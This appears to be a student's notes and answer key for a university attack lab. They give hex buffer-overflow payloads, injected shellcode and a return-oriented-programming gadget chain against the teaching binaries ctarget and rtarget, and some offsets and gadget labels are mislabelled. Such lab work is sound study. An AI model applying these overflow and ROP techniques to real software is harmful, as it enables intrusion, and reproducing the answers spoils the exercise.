@@ -1,0 +1,202 @@
+rsp:	0x5566fda0
+
+	0x5566fd98 
+
+
+
+  |		|		|	
+
+  |		|		|	
+
+  |		|		|
+
+  0x55685fe8      0x00000000     ->top of the stack
+
+
+
+When going into getbuf
+
+
+
+  |		|		|	
+
+  |		|		|
+
+  0x55685fe8      0x00000000     -> Got moved up
+  0x00401701      0x00000000     -> Pushed after getbuf was called
+					^^ this is the instruction after getbuf
+				           now it knows it has to return there after
+
+
+
+
+rps:	0x5566fd68 -> got moved
+
+There's no check on Gets() for the length of the input string
+
+Use this to inspect stack  x/40wx $rsp
+
+You have to return it to touch1 -> address 40153c
+
+
+Use ./hex2raw <fileName> saveFile.txt
+
+od -x saveFile.txt -> the output created by hex2raw
+
+od -t x1 saveFile.txt -> byte representation
+
+THIS IS LITTLE ENDIAN FORMATTING
+
+==============================================================================================
+
+LEVEL 1
+
+- Address after getbuf gets called : 401701 <- top of stack to return 
+- Address of touch1 : 000000000040153c
+- Address of getbuf : 0000000000401526
+
+My buffer is 0x28 -> 40 in decimal
+		  -> need 40 bytes of padding
+
+so solution 1:
+
+/* Padding is 40 bytes */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+/* insert touch1 address */
+3c 15 40 00 00 00 00 00 
+
+command to pass files : cat solution1.txt | ./hex2raw | ./ctarget
+
+==============================================================================================
+
+LEVEL 2
+
+Adress of cookie -> 0x76927bbf
+-> go to this address
+-> create .s file with instructions and then careate .o file form there (compile it)
+
+solution2.o:     file format elf64-x86-64
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 bf 7b 92 76 	mov    $0x76927bbf,%rdi
+   7:	c3                   	retq   
+
+then find rsp : 0x5566fd90
+and subtract the buffer size form it: 0x24
+
+0x5566fd90 - 0x28 = 0x5566fd68
+
+address of touch2 : 000000000040156a
+
+so solution 2:
+
+/* Disassembly from cookie */
+48 c7 c7 bf 7b 92 76 c3
+/* Padding is 40 bytes including address */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+/* rsp - buffer size */
+68 fd 66 55 00 00 00 00
+/* address of touch2 */
+6a 15 40 00 00 00 00 00
+
+command to pass files : cat solution2.txt | ./hex2raw | ./ctarget
+
+==============================================================================================
+
+LEVEL 3
+
+total bytes before the cookie = buffer + 8 for rsp + 8 for touch 3
+
+0x28 + 8 + 8 = 0x38
+
+/* rsp - buffer size */
+68 fd 66 55 00 00 00 00
+
+0x5566fd68 + 0x38 = 0x5566fda0
+
+address of touch3 : 0000000000401681
+
+cookie : 0x76927bbf
+with ascii : 37 36 39 32 37 62 62 66
+
+
+so solution 3:
+
+/* address of cookie = rsp + buffer + 16 bytes*/
+48 c7 c7 a0 fd 66 55 c3 
+/* Padding is 40 bytes including above for buffer*/
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+/* rsp */
+68 fd 66 55 00 00 00 00
+/* address of touch 3 */
+81 16 40 00 00 00 00 00
+/* cookie string */
+37 36 39 32 37 62 62 66 00
+
+command to pass files : cat solution3.txt | ./hex2raw | ./ctarget
+
+==============================================================================================
+
+LEVEL 4
+
+for rtarget
+-> return oriented programming
+
+- buffer is 0x28 : 40 00's
+- cookie : 0x76927bbf
+- address of touch 2 : 000000000040156a
+
+FOR GADGET 1:
+popq %rdi -> 58 , c3
+
+0000000000401752 <setval_388>:
+  401752:	c7 07 35 58 90 90    	movl   $0x90905835,(%rdi)
+  401758:	c3                   	retq   
+
+-> 401755
+
+
+FOR GADGET 2:
+movq $rax, $rdi -> 48 89 c7 , c3
+
+000000000040173e <addval_281>:
+  40173e:	8d 87 14 48 89 c7    	lea    -0x3876b7ec(%rdi),%eax
+  401744:	c3                   	retq   
+
+-> 401741
+
+so solution 4:
+
+/* buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+/* gadget 1 -> popq %rdi*/
+55 17 40 00 00 00 00 00
+/* value of cookie */
+bf 7b 92 76 00 00 00 00
+/* gadget 2 -> movq %eax,%rdi*/
+41 17 40 00 00 00 00 00
+/* address of touch2 */
+6a 15 40 00 00 00 00 00
+
+command to pass files : cat solution4.txt | ./hex2raw | ./rtarget
+
+==============================================================================================
+
+LEVEL 5
+
+I'm good...
